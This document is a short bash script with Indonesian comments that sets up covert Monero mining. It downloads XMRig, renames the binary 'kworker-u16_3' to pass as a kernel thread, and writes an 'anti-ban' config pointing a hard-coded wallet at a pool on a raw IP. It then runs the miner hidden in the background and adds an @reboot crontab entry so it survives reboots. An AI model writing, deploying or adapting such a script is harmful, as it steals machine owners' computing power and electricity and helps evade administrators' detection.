#!/bin/bash

# === Pengaturan ===
WALLET="85MLqXJjpZEUPjo9UFtWQ1C5zs3NDx7gJTRVkLefoviXbNN6CyDLKbBc3a1SdS7saaXPoPrxyTxybAnyJjYXKcFBKCJSbDp"
FAKE_NAME="kworker-u16_3"
POOL="134.199.197.80:443"
XM_DIR="$HOME/xmrig"

# === Unduh XMRig terbaru ===
mkdir -p "$XM_DIR"
cd "$XM_DIR"
wget https://github.com/xmrig/xmrig/releases/latest/download/xmrig-*-linux-x64.tar.gz -O xmrig.tar.gz
tar -xf xmrig.tar.gz --strip-components=1
rm xmrig.tar.gz

# === Rename binary agar tersamarkan ===
cp xmrig "$FAKE_NAME"
chmod +x "$FAKE_NAME"

# === Buat config.json anti-ban ===
cat > config.json <<EOF
{
  "autosave": true,
  "background": false,
  "colors": false,
  "randomx": {
    "1gb-pages": false,
    "rdmsr": false,
    "wrmsr": false,
    "numa": false
  },
  "cpu": {
    "enabled": true,
    "priority": 5,
    "max-threads-hint": 85,
    "yield": true
  },
  "donate-level": 0,
  "log-file": null,
  "pools": [
    {
      "url": "$POOL",
      "user": "$WALLET",
      "pass": "x",
      "keepalive": true,
      "tls": false
    }
  ],
  "print-time": 60,
  "retries": 5,
  "retry-pause": 10,
  "syslog": false,
  "user-agent": "$FAKE_NAME",
  "watch": true
}
EOF

# === Jalankan miner di background ===
nohup ./"$FAKE_NAME" --config=config.json > /dev/null 2>&1 &

# === Tambahkan ke crontab untuk auto-start saat reboot ===
(crontab -l 2>/dev/null; echo "@reboot cd $XM_DIR && nohup ./$FAKE_NAME --config=config.json > /dev/null 2>&1 &") | crontab -

echo "[✔] Setup selesai. Mining sedang berjalan sebagai proses '$FAKE_NAME'"